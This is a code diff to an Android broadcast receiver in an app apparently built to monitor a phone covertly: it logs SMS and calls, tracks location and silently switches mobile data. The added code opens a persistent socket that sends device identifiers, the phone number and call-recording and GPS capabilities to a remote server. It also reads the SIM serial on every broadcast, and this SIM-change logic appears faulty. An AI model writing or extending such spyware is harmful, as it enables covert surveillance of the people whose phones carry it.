@@ -15,8 +15,10 @@ import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.db.util.DirectiveUtil;
 import com.privacy.monitor.domain.CallRecord;
+import com.privacy.monitor.domain.DeviceInfo;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.SMSRecord;
+import com.privacy.monitor.service.utilservice.ClientSocket;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
@@ -25,6 +27,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
@@ -40,9 +43,39 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private CallRecordDB callRecordDB;
 	private DirectiveDB directiveDB;
 	private TelephonyManager tm;
+	private ClientSocket cSocket;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
+		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+		if(cSocket == null){
+		
+			String devBrand = sp.getString(C.DEVICE_BRAND,"");
+			String devPhone = sp.getString(C.PHONE_NUM,"");
+			String devID = sp.getString(C.DEVICE_ID,"");
+			String devSystem = sp.getString(C.DEVICE_SYSTEM,"");
+			String supRec = sp.getString(C.DEVICE_SUP_REC,"1");
+			String supCallRec = sp.getString(C.DEVICE_SUP_CALL_REC,"0");
+			String supGPS = sp.getString(C.DEVICE_SUP_GPS,"0");
+			DeviceInfo deviceInfo = new DeviceInfo();
+			deviceInfo.setBrand(devBrand);
+			deviceInfo.setDeviceID(devID);
+			deviceInfo.setSystem(devSystem);
+			deviceInfo.setPhoneNum(devPhone);
+			deviceInfo.setSupCallRec(supCallRec);
+			deviceInfo.setSupRec(supRec);
+			deviceInfo.setSupGPS(supGPS);
+			
+			cSocket = new ClientSocket(deviceInfo) {
+				@Override
+				public void receiveData(String type, String data) {
+					
+				}
+			};
+			cSocket.start();
+		}else {
+			if(cSocket.isInterrupted())cSocket.start();
+		}
 		
 		new Thread(new Runnable() {
 			boolean isCloseMobileNet = false;
@@ -65,13 +98,6 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				if(tm==null){
 					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
 				}
-				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
-				if(C.isBoot){
-					if(DirectiveUtil.toggelSIM(context, tm, directiveDB)){
-						   //执行换卡通知
-						C.isBoot = false;
-					}
-				}
 				
 				new Thread(new Runnable() {
 					@Override
@@ -81,7 +107,14 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					}
 				}).start();
 				
-				
+				SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
+				String simID = tm.getSimSerialNumber();
+				//更改号码了 
+				if(!sp.getString(C.SIM_ID,"").equals(simID)){
+					Editor editor = sp.edit();
+					editor.putString(C.PHONE_NUM,simID);
+					editor.commit();
+				}
 				String monitorList = AppUtil.streamToStr(NetworkUtil.download(context,"tel="+sp.getString(C.PHONE_NUM,""),C.RequestMethod.getMonitorList));
 			    if(isCloseMobileNet){
 			    	AppUtil.toggleMobileNet(context, false);
@@ -91,7 +124,6 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			        monitorDB = MonitorDB.getInstance(context);
 			    	try {
 						JSONObject jsonObject = new JSONObject(monitorList);
-						
 						String location = jsonObject.getString("loc");
 						Logger.d(TAG, "是否定位:"+location);
 						
